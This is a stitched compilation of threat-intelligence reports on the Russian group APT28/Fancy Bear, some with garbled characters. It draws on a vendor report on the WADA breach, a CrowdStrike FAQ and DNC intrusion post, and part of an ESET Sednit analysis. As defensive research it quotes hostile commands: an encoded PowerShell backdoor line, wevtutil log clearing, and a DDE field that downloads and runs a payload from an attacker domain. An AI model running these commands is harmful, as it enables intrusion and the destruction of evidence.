SPECIAL REPORT / APT28: AT THE CENTER OF THE STORM 6FROM OLYMPIC SLIGHT TO DATA LEAK: Investigating APT28 at the World Anti-Doping Agency As news of the DNC breach spread, APT28 was preparing for another set of operations: countering the condemnation that Russia was facing after doping allegations and a threatened blanket ban of the Russian team from the upcoming Rio Games. Russia, like many nations, has long viewed success in the Olympic Games as a source of national prestige and soft power on the world stage. The doping allegations and prospective ban from the Games further ostracized Russia, and likely provided motivation to actively counter the allegations by attempting to discredit anti-doping agencies and policies. Our investigation of APT28™s compromise of WADA™s network, and our observations of the surrounding events reveal how Russia sought to counteract a damaging narrative and delegitimize the institutions leveling criticism. ALLEGATIONS OF RUSSIAN ATHLETES™ WIDESPREAD DOPING NOV (2015) WADA declares the Russian Anti-Doping Agency (RUSADA) non- compliant. 24JULY 18 WADA-commissioned report documents evidence of Russian athletes™ widespread doping. 25AUG 4 Russian athletes were barred from competing in the Olympic Games. 26APT28 COMPROMISES WADA EARLY AUG APT28 sends spear phishing emails to WADA employees. 27AUG 10 APT28 uses a legitimate user account belonging to a Russian athlete to log into WADA™s Anti- Doping Administration and Management System (ADAMS) database. 28AUG 25-SEP 12 APT28 gains access to an International Olympic Committee account created speci˜cally for the 2016 Olympic Games, and views and downloads athlete data. 29 SPECIAL REPORT / APT28: AT THE CENTER OF THE STORM 7Based on this timeline of leak and threatened leak activity, as well as strikingly similar characteristics and distribution methods shared between @anpoland and ﬁFancy Bears™ Hack Team,ﬂ the same operators are highly likely behind the two personas. WADA o˝cials, citing evidence provided by law enforcement, stated that the threat activity originated in Russia, possibly in retaliation for WADA™s exposure of Russia™s expansive, state-run doping. 38 The statement prompted denials from the Russian Government, with Russian sports minister Vitaly Mutko asking, ﬁHow can you prove that the hackers are Russian?

FALSE HACKTIVIST PERSONAS CLAIM TO TARGET WADA, LEAK ATHLETE DATA AUG 9 The actor @anpoland, purporting to represent ﬁAnonymous Poland,ﬂ claims to have defaced the WADA website. 30 AUG 11 On August 11 @anpoland threatens to conduct a DDoS attack against and leak data from WADA, but fails to follow through on the threats. 31,32 SEP 12 ﬁFancy Bears™ Hack Teamﬂ, a previously unknown group purporting to be a˝liated with Anonymous, claims via Twitter to have compromised WADA, and directs readers to a website hosting stolen documents. 33 In tweets to international journalists and Twitter accounts that disseminate hacktivist and information security news, ﬁFancy Bears™ Hack Teamﬂ claims to have ﬁproof of American athletes taking doping.ﬂ 34 SEP 13 WADA releases a statement con˜rming the breach and attributes the compromise and theft of athlete medical data to APT28. 35SEP 15-30 ﬁFancy Bears™ Hack Teamﬂ releases ˜ve additional batches of medical ˜les for high-pro˜le athletes from multiple nations, including the U.S., which had applied for and received Therapeutic Use Exemptions (TUEs) for medications otherwise banned from competition. 36 Claiming to support ﬁfair play and clean sport,ﬂ Fancy Bears™ Hack team calls TUEs ﬁlicenses for doping.ﬂ 37 Since releasing our 2014 report, we continue to assess that APT28 is sponsored by the Russian Government. We further assess that APT28 is the group responsible for the network compromises of WADA and the DNC and other entities related to the 2016 U.S. presidential election cycle. These breaches involved the theft of internal data - mostly emails Œ that was later strategically leaked through multiple forums and propagated in a calculated manner almost certainly intended to advance particular Russian Government aims. In a report released on January 7 2017, the U.S. Directorate of National Intelligence described this activity as an ﬁin˚uence campaign.ﬂ This in˚uence campaign - a combination of network compromises and subsequent data leaks - aligns closely with the Russian military™s publicly stated intentions and capabilities. In˚uence operations, also frequently called ﬁinformation operations,ﬂ have a long history of inclusion in Russian strategic doctrine, and have been intentionally developed, deployed, and modernized with the advent of the internet. The recent activity in the U.S. is but one of many instances of Russian Government in˚uence operations conducted in support of strategic political objectives, and it will not be the last. As the 2017 elections in Europe approach - most notably in Germany, France, and the Netherlands - we are already seeing the makings of similarly concerted e˛orts. CONCLUSION SPECIAL REPORT / APT28: AT THE CENTER OF THE STORM 8 SPECIAL REPORT / APT28: AT THE CENTER OF THE STORM 9In our 2014 report, we identi˜ed APT28 as a suspected Russian government-sponsored espionage actor. We came to this conclusion in part based on forensic details left in the malware that APT28 had employed since at least 2007. We have provided an updated version of those conclusions, a layout of the tactics that they generally employ, as well as observations of apparent tactical shifts. For full details, please reference our 2014 report, APT28: A Window into Russia™s Cyber Espionage Operations ? APT28 employs a suite of malware with features indicative of the group™s plans for continued operations, as well as the group™s access to resources and skilled developers. Key characteristics of APT28™s toolset include: Ł A ˜exible, modular framework that has allowed APT28 to consistently evolve its toolset since at least 2007. Ł Use of a formal coding environment in which to develop tools, allowing the group to create and deploy custom modules within its backdoors. Ł Incorporation of counter-analysis capabilities including runtime checks to identify an analysis environment, obfuscated strings unpacked at runtime, and the inclusion of unused machine instructions to slow analysis. Ł Code compiled during the normal working day in the Moscow time zone and within a Russian language build environment. OVER 97% OF APT28™S MALWARE SAMPLES WERE COMPILED DURING THE WORKING WEEK 88% OF SAMPLES COMPILED BETWEEN 8AM AND 6PM IN THE TIMEZONE THAT INCLUDES MAJOR RUSSIAN CITIES SUCH AS MOSCOW AND ST. PETERSBURG IN ADDITION, APT28™S DEVELOPERS CONSISTENTLY BUILT MALWARE IN RUSSIAN LANGUAGE SETTINGS UNTIL 2013 APPENDIX: APT28™s Tools, Tactics, and Operational Changes SPECIAL REPORT / APT28: AT THE CENTER OF THE STORM 10APT28™S MALWARE SUITE TOOL ROLE AKA CHOPSTICK backdoor Xagent, webhp, SPLM, (.v2 fysbis) EVILTOSS backdoor Sedreco, AZZY, Xagent, ADVSTORESHELL, NETUI GAMEFISH backdoor Sednit, Seduploader, JHUHUGIT, Sofacy SOURFACE downloader Older version of CORESHELL, Sofacy OLDBAIT credential harvester Sas˚s CORESHELL downloader Newer version of SOURFACE, Sofacy APT28™S OPERATIONAL CHANGES SINCE 2014 APT28 continues to evolve its toolkit and re˜ne its tactics in what is almost certainly an e˛ort to protect its operational e˛ectiveness in the face of heightened public exposure and scrutiny. In addition to the continued evolution of the group™s ˜rst stage tools, we have also noted APT28: Ł Leveraging zero-day vulnerabilities in Adobe Flash Player, Java, and Windows, including CVE-2015-1701, CVE-2015-2424, CVE-2015-2590, CVE-2015-3043, CVE-2015-5119, and CVE- 2015-7645. Ł Using a pro˚ling script to deploy zero-days and other tools more selectively, decreasing the chance that researchers and others will gain access to the group™s tools. Ł Increasing reliance on public code depositories , such as Carberp, PowerShell Empire, P.A.S. webshell, Metasploit modules, and others in a likely e˛ort to accelerate their development cycle and provide plausible deniability. Ł Obtaining credentials through fabricated Google App authorization and Oauth access requests that allow the group to bypass two-factor authentication and other security measures. Ł Moving laterally through a network relying only on legitimate tools that already exist within the victims™ systems, at times forgoing their traditional toolset for the duration of the compromise. These changes are not only indicative of APT28™s skills, resourcefulness, and desire to maintain operational e˛ectiveness, but also highlight the longevity of the group™s mission and its intent to continue its activities for the foreseeable future. SPECIAL REPORT / APT28: AT THE CENTER OF THE STORM 11APT28 TACTICS We have observed APT28 rely on four key tactics when attempting to compromise intended targets. These include sending spear-phishing emails that either deliver exploit documents that deploy malware onto a user™s systems, or contain a malicious URL designed to harvest the recipients™ email credentials and provide access to the their accounts. APT28 has also compromised and placed malware on legitimate websites intending to infect site visitors, and has gained access to organizations by compromising their web-facing servers .APT28 IS IN YOUR NETWORK. Victim goes to link and retrieves malicious document or is served a web-based exploit that installs malware. (Flash Vulnerability CVE- 2016-7855 and Windows Vulnerability CVE-2016-7255 were exploited as zero days to install malware on victims who visited a malicious URL). Victim opens document, and malware is installed by exploiting a vulnerability (e.g., ARM-NATO_ ENGLISH_30_NOV_2016. doc leveraged an Adobe Flash exploit, CVE-2016-7855, to install GAMEFISH targeted machine). TACTIC Craft exploit document with enticing lure content. Send exploit document to victim. Send link mirroring structure of legitimate organization™s site that is designed to expire once users clickit. Register a domain spoo˜ng that of a legitimate organization (e.g., theguardiannews.org). INFECTION WITH MALWARE VIA SPEAR PHISH Person is asked to authorize application to view mail and gives access. APT28 leverages OAuth privileges given to malicious application to read email. Recipient visits fake login page and enters credentials. APT28 uses stolen credentials to access mailbox and read email. Register a domain spoo˜ng a webmail service or an organization™s webmail portal (e.g., 0nedrive-0˝ce365.com) Send email to targets instructing them to reset their passwords. Send email to victims warning of security risk and asking them to enable security service. TACTIC WEBMAIL ACCESS VIA SPEAR-PHISH SPECIAL REPORT / APT28: AT THE CENTER OF THE STORM 12APT28 IS IN YOUR NETWORK. Users of the site are redirected using malicious iFrame and pro˜led (e.g, this technique was used to compromise and infect visitors to numerous Polish Government websites in 2014). Exploit is served to users matching the target pro˜le and malware is installed on their system. Compromise a legitimate site and set up malicious iFrame. TACTIC INFECTION WITH MALWARE VIA STRATEGIC WEB COMPROMISE (SWC) APT28 IS IN YOUR NETWORK. Exploitation of previously known vulnerabilities present on unpatched systems. Leverage initial compromise to access other systems and move deeper into the victim network. Network reconnaissance to ˜nd vulnerable software.

We are one of the fastest growing global companies in cybersecurity today.\\nOur founders have no connections to Ukraine. Suggestions to the contrary are completely false.\\nWe have never had physical possession of the DNC servers. We conducted our investigation using a process called “imaging” — an established practice in cyber investigations that involves making a copy of the hard drives and memory. This is standard procedure for cyber investigations.\\nWe worked closely with law enforcement and provided all forensic evidence and analysis to the FBI as requested.\\nWe are proud of our work and will remain focused on our mission of protecting our customers around the world from dangerous cyber threats.We are grateful that the media has debunked false claims about our work for the Democratic National Committee (DNC) in 2016:\\nNBC News, Meet the Press 12/29/19:\\nClint Watts and Chuck Todd discuss CrowdStrike and the conspiracy theory that has been debunked.\\nTranscript here: https://www.nbcnews.com/meet-the-press/meet-press-december-29-2019-n1106036\\nThe Washington Post, In call to Ukraine’s president, Trump revived a favorite conspiracy theory about the DNC hack:\\nDiscusses the CrowdStrike conspiracy theory and how it has been debunked.\\nCNN Business, What is CrowdStrike and why is it part of the Trump whistleblower complaint?:\\nGives background on CrowdStrike and debunks the conspiracy theory\\nWired, How Trump’s Ukraine Mess Entangled CrowdStrike:\\nDiscusses the CrowdStrike theory and debunks the idea that there is a missing server.\\nNBC News, Debunking The Crowdstrike Conspiracy Theory\\nDiscusses the CrowdStrike theory and how it has been debunked.\\nThe Daily Beast, The Truth About Trump’s Insane Ukraine ‘Server’ Conspiracy:\\nDescribes why Trump’s theories about Ukraine and CrowdStrike have been debunked.\\nCNN, “Don’t miss the totally debunked conspiracy theory Donald Trump pushed in the Ukraine call”\\nDiscusses the conspiracy theory and how it has been debunked.\\nSeptember 25, 2019 Update:\\nWith regards to our investigation of the DNC hack in 2016, we provided all forensic evidence and analysis to the FBI. As we’ve stated before, we stand by our findings and conclusions that have been fully supported by the US Intelligence community.\\nFAQ on Recent News Coverage of CrowdStrike\\nIs your owner Ukrainian?\\nNo. CrowdStrike was founded by George Kurtz and Dmitri Alperovitch. George is an American entrepreneur and recognized security expert, author, entrepreneur, and speaker. He also started Foundstone, a worldwide security products and services company that was acquired by McAfee in 2004.\\nCrowdStrike’s Co-founder Dmitri Alperovitch is a Russia-born U.S. citizen, who has spent all of his adult life in the United States, and has no connection to Ukraine.\\nAs a public company, our ownership is available on the SEC.gov website.\\nDo you stand behind your work for the DNC?\\nAs we’ve repeatedly stated, we stand by the findings and analysis of our investigation, and, as detailed in our company statement, we’ve provided all forensic evidence and analysis to the FBI as requested. Additionally, our findings have been supported by the U.S. intelligence community and other cybersecurity companies.\\nThe investigation is detailed on our blog below.\\nDid you comply with FBI’s requests for information?\\nWe’ve provided all forensic evidence and analysis to the FBI related to the DNC investigation as requested. We have never declined any request for information from the FBI related to this investigation, and there are no pending requests for information by the FBI.\\nDo you have the DNC servers?\\nWe have never taken physical possession of any DNC servers. When cyber investigators respond to an incident, they capture that evidence in a process called “imaging.” It involves making an exact byte-for-byte copy of the hard drives. They do the same for the machine’s memory, capturing evidence that would otherwise be lost at the next reboot, and they monitor and store the traffic passing through the victim’s network. This has been standard procedure in incident response investigations for decades. The images, not the computer’s hardware, provide the evidence.\\nOur cloud-native, crowdsourced approach to solving cybersecurity enables us to deliver state- of-the-art protection to organizations big and small. Consequently, we are proud that customers from every major industry, level of government, and political affiliation turn to CrowdStrike to stop breaches.\\nAre you affiliated with the Democratic party?\\nCrowdStrike is not affiliated with any political party. We are a public cybersecurity company, and are non-partisan. We have done cybersecurity work for, and currently protect, both Republican and Democratic political organizations at the state, local, and federal level, and we have thousands of non-political companies and organizations as customers.\\nDo you have Secretary Hillary Clinton’s email server? Have you ever had access to her emails?\\nNo. We have never worked for Secretary Clinton or her campaign, and never had access to her server or emails.\\nWhere can I find more information?\\nMany news outlets have written about CrowdStrike’s investigation of the DNC hack and subsequent comments made by President Trump.

On June 15, 2016 a blog post to a WordPress site authored by an individual using the moniker Guccifer 2.0 claimed\\xa0credit for breaching the Democratic National Committee. This blog post presents documents alleged to have originated from the DNC.\\nWhether or not this posting is part of a Russian Intelligence disinformation campaign, we are exploring the documents’ authenticity and origin. Regardless, these claims do nothing to lessen our findings relating to the Russian government’s involvement, portions of which we have documented for the public and the greater security community.\\nJune 14, 2016\\nBears in the Midst: Intrusion Into the Democratic National Committee\\nBy Dmitri Alperovitch\\nThere is rarely a dull day at CrowdStrike where we are not detecting or responding to a breach at a company somewhere around the globe. In all of these cases, we operate under strict confidentiality rules with our customers and cannot reveal publicly any information about these attacks. But on rare occasions, a customer decides to go public with information about their incident and give us permission to share our knowledge of the adversary tradecraft with the broader community and help protect even those who do not happen to be our customers. This story is about one of those cases.\\nCrowdStrike Services Inc., our Incident Response group, was called by the Democratic National Committee (DNC), the formal governing body for the US Democratic Party, to respond to a suspected breach. We deployed our IR team and technology and immediately identified two sophisticated adversaries on the network – COZY BEAR and FANCY BEAR. We’ve had lots of experience with both of these actors attempting to target our customers in the past and know them well. In fact, our team considers them some of the best threat actors out of all the numerous nation-state, criminal and hacktivist/terrorist groups we encounter on a daily basis. Their tradecraft is superb, operational security second to none and the extensive usage of ‘living-off-the-land’ techniques enables them to easily bypass many security solutions they encounter. In particular, we identified advanced methods consistent with nation-state level capabilities including deliberate targeting and ‘access management’ tradecraft – both groups were constantly going back into the environment to change out their implants, modify persistent methods, move to new Command & Control channels and perform other tasks to try to stay ahead of being detected. Both adversaries engage in extensive political and economic espionage for the benefit of the government of the Russian Federation and are believed to be closely linked to the Russian government’s powerful and highly capable intelligence services.\\nCOZY BEAR (also referred to in some industry reports as CozyDuke or APT 29) is the adversary group that last year successfully infiltrated the unclassified networks of the White House, State Department, and US Joint Chiefs of Staff. In addition to the US government, they have targeted organizations across the Defense, Energy, Extractive, Financial, Insurance, Legal, Manufacturing Media, Think Tanks, Pharmaceutical, Research and Technology industries, along with Universities. Victims have also been observed in Western Europe, Brazil, China, Japan, Mexico, New Zealand, South Korea, Turkey and Central Asian countries. COZY BEAR’s preferred intrusion method is a broadly targeted spearphish campaign that typically includes web links to a malicious dropper. Once executed on the machine, the code will deliver one of a number of sophisticated Remote Access Tools (RATs), including AdobeARM, ATI-Agent, and MiniDionis. On many occasions, both the dropper and the payload will contain a range of techniques to ensure the sample is not being analyzed on a virtual machine, using a debugger, or located within a sandbox. They have extensive checks for the various security software that is installed on the system and their specific configurations. When specific versions are discovered that may cause issues for the RAT, it promptly exits. These actions demonstrate a well-resourced adversary with a thorough implant-testing regime that is highly attuned to slight configuration issues that may result in their detection, and which would cause them to deploy a different tool instead. The implants are highly configurable via encrypted configuration files, which allow the adversary to customize various components, including C2 servers, the list of initial tasks to carry out, persistence mechanisms, encryption keys and others. An HTTP protocol with encrypted payload is used for the Command & Control communication.\\nFANCY BEAR (also known as Sofacy or APT 28) is a separate Russian-based threat actor, which has been active since mid 2000s, and has been responsible for targeted intrusion campaigns against the Aerospace, Defense, Energy, Government and Media sectors. Their victims have been identified in the United States, Western Europe, Brazil, Canada, China, Georgia, Iran, Japan, Malaysia and South Korea. Extensive targeting of defense ministries and other military victims has been observed, the profile of which closely mirrors the strategic interests of the Russian government, and may indicate affiliation with Главное Разведывательное Управление (Main Intelligence Department) or GRU, Russia’s premier military intelligence service. This adversary has a wide range of implants at their disposal, which have been developed over the course of many years and include Sofacy, X-Agent, X-Tunnel, WinIDS, Foozer and DownRage droppers, and even malware for Linux, OSX, IOS, Android and Windows Phones. This group is known for its technique of registering domains that closely resemble domains of legitimate organizations they plan to target. Afterwards, they establish phishing sites on these domains that spoof the look and feel of the victim’s web-based email services in order to steal their credentials. FANCY BEAR has also been linked publicly to intrusions into the German Bundestag and France’s TV5 Monde TV station in April 2015.\\nAt DNC, COZY BEAR intrusion has been identified going back to summer of 2015, while FANCY BEAR separately breached the network in April 2016. We have identified no collaboration between the two actors, or even an awareness of one by the other. \\xa0Instead, we observed the two Russian espionage groups compromise the same systems and engage separately in the theft of identical credentials. While you would virtually never see Western intelligence agencies going after the same target without de-confliction for fear of compromising each other’s operations, in Russia this is not an uncommon scenario. “Putin’s Hydra: Inside Russia’s Intelligence Services”, a recent paper from European Council on Foreign Relations, does an excellent job outlining the highly adversarial relationship between Russia’s main intelligence services – Федеральная Служба Безопасности (FSB), the primary domestic intelligence agency but one with also significant external collection and ‘active measures’ \\xa0remit, Служба Внешней Разведки (SVR), the primary foreign intelligence agency, and the aforementioned GRU. Not only do they have overlapping areas of responsibility, but also rarely share intelligence and even occasionally steal sources from each other and compromise operations. Thus, it is not surprising to see them engage in intrusions against the same victim, even when it may be a waste of resources and lead to the discovery and potential compromise of mutual operations.\\nThe COZY BEAR intrusion relied primarily on the SeaDaddy implant developed in Python and compiled with py2exe and another Powershell backdoor with persistence accomplished via Windows Management Instrumentation (WMI) system, which allowed the adversary to launch malicious code automatically after a specified period of system uptime or on a specific schedule. The Powershell backdoor is ingenious in its simplicity and power. It consists of a single obfuscated command setup to run persistently, such as:\\npowershell.exe -NonInteractive -ExecutionPolicy Bypass -EncodedCommand

Powershell version of credential theft tool MimiKatz was also used by the actors to facilitate credential acquisition for lateral movement purposes.\\nFANCY BEAR adversary used different tradecraft, deploying X-Agent malware with capabilities to do remote command execution, file transmission and keylogging. It was executed via rundll32 commands such as:\\nrundll32.exe “C:\\\\Windows\\\\twain_64.dll”\\nIn addition, FANCY BEAR’s X-Tunnel network tunneling tool, which facilitates connections to NAT-ed environments, was used to also execute remote commands. Both tools were deployed via RemCOM, an open-source replacement for PsExec available from GitHub. They also engaged in a number of anti-forensic analysis measures, such as periodic event log clearing (via wevtutil cl System\\nand wevtutil cl Security\\ncommands) and resetting timestamps of files.\\nIntelligence collection directed by nation state actors against US political targets provides invaluable insight into the requirements directed upon those actors. Regardless of the agency or unit tasked with this collection, the upcoming US election, and the associated candidates and parties are of critical interest to both hostile and friendly nation states. The 2016 presidential election has the world’s attention, and leaders of other states are anxiously watching and planning for possible outcomes. Attacks against electoral candidates and the parties they represent are likely to continue up until the election in November.\\nIndicators of Compromise:\\nIOC\\nAdversary\\nIOC Type\\nAdditional Info\\n6c1bce76f4d2358656132b6b1d471571820688ccdbaca0d86d0ca082b9390536\\nCOZY BEAR\\nSHA256\\npagemgr.exe (SeaDaddy implant)\\nb101cd29e18a515753409ae86ce68a4cedbe0d640d385eb24b9bbb69cf8186ae\\nCOZY BEAR\\nSHA256\\npagemgr.exe\\n(SeaDaddy implant)\\n185.100.84.134:443\\nCOZY BEAR\\nC2\\nSeaDaddy implant C2\\n58.49.58.58:443\\nCOZY BEAR\\nC2\\nSeaDaddy implant C2\\n218.1.98.203:80\\nCOZY BEAR\\nC2\\nPowershell implant C2\\n187.33.33.8:80\\nCOZY BEAR\\nC2\\nPowershell implant C2\\nfd39d2837b30e7233bc54598ff51bdc2f8c418fa5b94dea2cadb24cf40f395e5\\nFANCY BEAR\\nSHA256\\ntwain_64.dll\\n(64-bit X-Agent implant)\\n4845761c9bed0563d0aa83613311191e075a9b58861e80392914d61a21bad976\\nFANCY BEAR\\nSHA256\\nVmUpgradeHelper.exe (X-Tunnel implant)\\n40ae43b7d6c413becc92b07076fa128b875c8dbb4da7c036639eccf5a9fc784f\\nFANCY BEAR\\nSHA256\\nVmUpgradeHelper.exe\\n(X-Tunnel implant)\\n185.86.148.227:443\\nFANCY BEAR\\nC2\\nX-Agent implant C2\\n45.32.129.185:443\\nFANCY BEAR\\nC2\\nX-Tunnel implant C2\\n23.227.196.217:443\\nFANCY BEAR\\nC2\\nX-Tunnel implant C2\\nInterested in learning more about CrowdStrike’s Falcon platform?\\nFalcon Prevent – Next Generation AV\\nFalcon Insight – Managed Endpoint Detection and Response\\nFalcon Discover – Network Security Monitoring\\nFalcon Overwatch – Threat Hunting\\nFalcon X – Threat Intel\\nTweet\\nShare\\nRelated Content\\nHow to Sniff Out (and Block) BloodHound Attacks\\nThe growing adversary focus on\\xa0“big game hunting” (BGH) in ransomware attacks — targeting organizations and data…\\nCommon Attacks and Effective Mitigation: 2020 CrowdStrike Services Report Key Findings (Part 2 of 2)\\nYour organization is constantly under attack, and every day, adversaries are developing new ways to breach…\\nKnow Your Attackers: 2020 CrowdStrike Services Report Key Findings (Part 1 of 2)\\nThe cybersecurity landscape is always evolving, but one thing remains constant: Cyber adversaries continue to be…\\nCategories\\nEndpoint Protection (179)\\nEngineering & Tech (13)\\nExecutive Viewpoint (103)\\nFrom The Front Lines (86)\\nResearch & Threat Intel (124)\\nTech Center (66)\\nCONNECT WITH US\\nFeatured Articles\\nThe CrowdStrike 2020 Global Threat Report Reveals Troubling Advances in Cybercrime\\nMarch 3, 2020\\nAt RSA 2020, CrowdStrike Wins SC Media Excellence Award for Best Security Company\\nFebruary 28, 2020\\nCrowdStrike Unveils Exciting New Capabilities at RSA 2020\\nFebruary 25, 2020\\nCrowdStrike’s Matt LeMiere on Why Schools Are Failing Cybersecurity\\nFebruary 21, 2020\\nSUBSCRIBE\\nSign up now to receive the latest notifications and updates from CrowdStrike.\\nSIGN UP\\nSee CrowdStrike Falcon in Action\\nDetect, prevent, and respond to attacks— even malware-free intrusions—at any stage, with next-generation endpoint protection.\\nSEE DEMO\\nA Roadmap to Cybersecurity Maturity, Part 2: Am I Mature?\\nKnow Your Attackers: 2020 CrowdStrike Services Report Key Findings (Part 1 of 2)\\nRecent Articles\\nFeatured Articles\\nVideos\\nCategories\\nSee Demo\\nRequest Info\\nCrowdStrike Main Site\\nTry CrowdStrike Free for 15 Days Get Started with A Free Trial\\nX\\nCopyright © 2020 CrowdStrike\\nPrivacy\\nRequest Info\\nBlog\\nJoin Our Team\\nSitemap\\nContact Us\\n1.888.512.8906\\nEnglish\\nEspañol\\nItaliano\\nFrançais\\nDeutsch\\n日本語', 'Sednit update: How Fancy Bear Spent the Year | WeLiveSecurity\\nIn English\\nEm Português\\nEn français\\nEn Español\\nIn Deutsch\\nMenu\\ntoggle menu\\nAll Posts\\nResearch\\nHow To\\nVideos\\nPodcasts\\nConference Materials\\nWhite Papers\\nMagazine\\nOur Experts\\nEm Português\\nEn français\\nEn Español\\nIn Deutsch\\nAward-winning news, views, and insight from the ESET security community\\nSednit update: How Fancy Bear Spent the Year\\nOver the past few years the Sednit group has used various techniques to deploy their various components on targets computers.

The attack usually starts with an email containing either a malicious link or malicious attachment.\\nThe Sednit group — also known as Strontium, APT28, Fancy Bear or Sofacy\\u2009—\\u2009is a group of attackers operating since 2004, if not earlier, and whose main objective is to steal confidential information from specific targets.\\nThis article is a follow-up to ESET’s presentation at BlueHat in November 2017. Late in 2016 we published a white paper covering Sednit activity between 2014 and 2016. Since then, we have continued to actively track Sednit’s operations, and today we are publishing a brief overview of what our tracking uncovered in terms of the group’s activities and updates to their toolset. The first section covers the update of their attack methodology: namely, the ways in which this group tries to compromise their targets systems. The second section covers the evolution of their tools, with a particular emphasis on a detailed analysis of a new version of their flagship malware: Xagent.\\nThe Campaigns\\nOver the past few years the Sednit group has used various techniques to deploy their various components on targets computers. The attack usually starts with an email containing either a malicious link or malicious attachment. We have seen a shift in the methods they use ‘in the course of the year’, though. Sedkit was their preferred attack vector in the past, but that exploit kit has completely disappeared since late 2016. The DealersChoice exploit platform has been their preferred method since the publication of our white paper, but we saw other methods being used by this group, such as macros or the use of Microsoft Word Dynamic Data Exchange.\\nThe following three sections will describe the different methods used by Sednit’s operator to gain an initial foothold on a target system. Generally, these campaigns will try to install Seduploader on the target system. Seduploader is a first stage backdoor that can be used to assess the target’s importance and download additional malware. If the system is indeed of interest to them, it is likely that Sednit’s operators will eventually install Xagent on it.\\nSedkit (Sednit Exploit Kit)\\nSedkit was an exploit kit used exclusively by the Sednit group. During its lifetime, Sednit leveraged vulnerabilities in various persistently vulnerable applications, but mostly Adobe Flash and Internet Explorer. When Sedkit was first discovered, potential victims were redirected to its landing page through a watering-hole scheme. Following that campaign, their preferred method consisted of malicious links embedded in emails sent to Sednit’s targets. Sedkit’s workflow is illustrated below.\\nBetween August and September 2016, we saw several different email campaigns trying to lure the recipients of their messages to a Sedkit landing page. Sedkit’s targets at that time were mostly embassies, and political parties in Central Europe. The next figure shows an email containing such a URL.\\nThe email tries to fool its recipient into believing that the link will ultimately lead to an interesting news story. In this case, the article is supposedly about an earthquake that struck near Rome in August 2016. While the email impersonates someone the victim would consider trustworthy, there are two major hints that could lead an attentive recipient to conclude that this email is fake. The first one is that there are spelling mistakes (e.g. “Greetigs!”). Spelling mistakes are common in malicious Sednit mails. The second one is the URL’s domain part. It is a purely malicious domain, but the path part of the URL actually mimics a real, legitimate link. In this particular case, the URL path is the same as one used in a BBC story about this earthquake. Again, this is a commonly-used Sednit tactic, using popular stories found on legitimate news websites and redirecting targets that click on the emailed URL to the real website, but not before visiting the Sedkit landing page. Besides the BBC, The Huffington Post is another popular media outlet whose stories they like to use as bait.\\nThe email shown below, where the link redirects to Sedkit, exhibits several interesting features.\\nFirstly, the email’s subject and URL path are not aligned: the former refers to Syria and Aleppo while the latter refers to WADA and Russian hacking. Secondly, there are two glaring spelling mistakes. The first one, is again the use of “Greetigs!” and the second one is “Unated Nations”. Hopefully, someone working for the United Nations’ public relations department would not have such a glaring error in their email signature block.\\nThe last campaign using Sedkit was observed in October 2016. It is interesting to note that the disappearance of Sedkit follows a trend we have seen with other exploit kits. Most of these were relying exploits for older versions of Internet Explorer and/or Flash to perform drive-by downloads. The decline of the majority of exploit kit operations during 2016, including Sednit, could well be attributable to the code hardening performed by Microsoft and Adobe.\\nFull details of Sedkit’s inner workings can be found in our previously published white paper.\\nDealersChoice\\nIn August 2016, Palo Alto Networks blogged about a new platform used by Sednit to breach a system initially. This platform, which they called DealersChoice, has the ability to generate malicious documents with embedded Adobe Flash Player exploits. There are two variants of this platform. The first one checks which Flash Player version is installed on the system and then selects one of three different vulnerabilities. The second variant will first contact a C&C server which will deliver the selected exploit and the final malicious payload. Of course, the second version is much harder to analyze, as the document delivered to the targets does not contain all the pieces of the puzzle.\\nThis platform is still in use today by Sednit and, like Sedkit, tracks international news stories and includes a reference to them in their malicious emails, in an attempt to lure the target into opening the malicious document attachment. Sometimes, they also use other, non-political, schemes. In December 2016, they used a rather unusual (for the group) lure:\\nThis email was sent to multiple Ministries of Foreign Affairs and embassies in Europe on December 22nd and 23rd, and contained a Word document attachment that appeared to be a Christmas eCard. Note that this was the first time that we saw the Sednit group use a non-geopolitical phishing gambit attempting to trap their targets. Of course, the Word document, if opened, uses DealersChoice to try to compromise the system. Sednit used DealersChoice intensively in late 2016, but the platform was not seen for a long time after that. In fact, the first time we saw them use it in 2017 was in October.\\nWe do not have the email used for this particular campaign, but, based on the decoy document, we can assume that government agency employees were the targets. Other campaigns using DealersChoice were the subject of different blogs published by security researchers. One noteworthy example is the one by Proofpoint where they detail the addition of a new Adobe Flash Player vulnerability to the DealersChoice platform. This indicates that this platform is still in use by this group and under constant development.\\nMacros, VBA and DDE\\nBesides Sedkit and DealersChoice, Sednit’s operators also continued using proven ways to compromise systems they target by relying on macros in a Microsoft Office documents, but also used other methods. One campaign that grabbed a lot of attention targeted an Eastern European MFA in April 2017. The following email was sent to an MFA employee:\\nThe attachment contained code exploiting two zero-days: one local privilege escalation (LPE) and one remote code execution (RCE). These two zero-days were reported by ESET to Microsoft. A detailed analysis of this campaign can be found on our blog.\\nThe final case highlighted here illustrates how Sednit’s operators pay close attention to new technical developments in security. In the beginning of October 2017, SensePost researchers wrote an article on a Microsoft Word methods called the Dynamic Data Exchange (DDE) protocol. DDE is a way to exchange data between applications. For example, it allows a Word table to be updated with the data contained in an Excel document. It is convenient, but in the case of at least Word and Excel it can also be used to execute arbitrary code, if the user ignores several warning prompts. Following the publication of that article, it did not take long to discover Sednit campaigns using DDE to execute code from a C&C server. In these campaigns, documented by McAfee, the decoy document is empty, but it contains a hidden field containing the following code:\\nDDE\\n\"C:\\\\\\\\Programs\\\\\\\\Microsoft\\\\\\\\Office\\\\\\\\MSWord.exe\\\\\\\\..\\\\\\\\..\\\\\\\\..\\\\\\\\..\\\\\\\\Windows\\\\\\\\System32\\\\\\\\WindowsPowerShell\\\\\\\\v1.0\\\\\\\\powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString(\\'http://sendmevideo.org/dh2025e/eee.txt\\');powershell -enc $e # \" \"a slow internet connection\" \"try again later\"\\n1\\n\"C:\\\\\\\\Programs\\\\\\\\Microsoft\\\\\\\\Office\\\\\\\\MSWord.exe\\\\\\\\..\\\\\\\\..\\\\\\\\..\\\\\\\\..\\\\\\\\Windows\\\\\\\\System32\\\\\\\\WindowsPowerShell\\\\\\\\v1.0\\\\\\\\powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString(\\'http://sendmevideo.org/dh2025e/eee.txt\\');powershell -enc $e # \" \"a slow internet connection\" \"try again later\"\\nIf the intended potential victim opens the document and makes the foolhardy chose to ignore the warnings, the above script is executed and the Seduploader binary is downloaded from the C&C server and executed on the target’s system.\\nThis is only a brief overview of how the Sednit operators have been trying to compromise new victims since the publication of our white paper. As you can see, they are just as active as they were and are still actively targeting governments 